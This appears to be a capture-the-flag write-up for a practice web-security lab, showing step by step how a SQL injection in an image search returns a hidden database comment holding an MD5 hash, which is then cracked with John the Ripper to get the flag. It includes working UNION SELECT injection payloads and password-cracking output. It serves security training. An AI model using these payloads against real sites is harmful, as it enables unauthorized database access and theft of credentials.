Vulnerability name : SQL Injection

How to defend : Sanitize user input

We go through each starting from 1 and when arriving at 5

```
ID: 5
Title: Hack me ?
Url : borntosec.ddns.net/images.png
```

First we try inputting a single quote to see if an error comes back, as that would
tell us if this search function is vulnerable for an sql injection.
Sadly we get nothing back so some amount of sanitization is taking place.

We'll try something else :

```
5 OR 1=1--
```

and the output is :

```
ID: 5 OR 1=1--
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_

ID: 5 OR 1=1--
Title: 42 !
Url : https://fr.wikipedia.org/wiki/Fichier:42

ID: 5 OR 1=1--
Title: Google
Url : https://fr.wikipedia.org/wiki/Logo_de_Go

ID: 5 OR 1=1--
Title: Earth
Url : https://en.wikipedia.org/wiki/Earth#/med

ID: 5 OR 1=1--
Title: Hack me ?
Url : borntosec.ddns.net/images.png
```

which means that it is vulnerable to sql injections !

Now we use another command to see what tables we have access to

```
ID: -1 UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema=DATABASE()--
Title: list_images
Url :
```

We can access the values in list_images, as expected.
So now we do list the values :

```
ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573--
Title: id
Url :

ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573--
Title: url
Url :

ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573--
Title: title
Url :

ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573--
Title: comment
Url :
```

There is a comment, which is a hidden field normally for the user.
Fecthing the values for the comment gives us :

```
ID: 6 UNION SELECT title, comment FROM list_images--
Title: An image about the NSA !
Url : Nsa

ID: 6 UNION SELECT title, comment FROM list_images--
Title: There is a number..
Url : 42 !

ID: 6 UNION SELECT title, comment FROM list_images--
Title: Google it !
Url : Google

ID: 6 UNION SELECT title, comment FROM list_images--
Title: Earth!
Url : Earth

ID: 6 UNION SELECT title, comment FROM list_images--
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?
```

And we found the flag. Now we just need to decode it using John the Ripper.

```
darklyProject git:(master) ✗ ../john/run/john --format=Raw-MD5 comment
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=20
Note: Passwords longer than 18 [worst case UTF-8] to 55 [ASCII] rejected
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Warning: Only 22 candidates buffered for the current salt, minimum 24 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
0g 0:00:00:00 DONE 1/3 (2024-11-26 19:24) 0g/s 8564p/s 8564c/s 8564C/s Getflag1905..Getflag1900
Proceeding with wordlist:../john/run/password.lst
Enabling duplicate candidate password suppressor
albatroz         (GetFlag)
1g 0:00:00:00 DONE 2/3 (2024-11-26 19:24) 2.703g/s 645318p/s 645318c/s 645318C/s billy420..sylveste
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

albatroz to sha256 gives us : F2A29020EF3132E01DD61DF97FD33EC8D7FCD1388CC9601E7DB691D17D4D6188
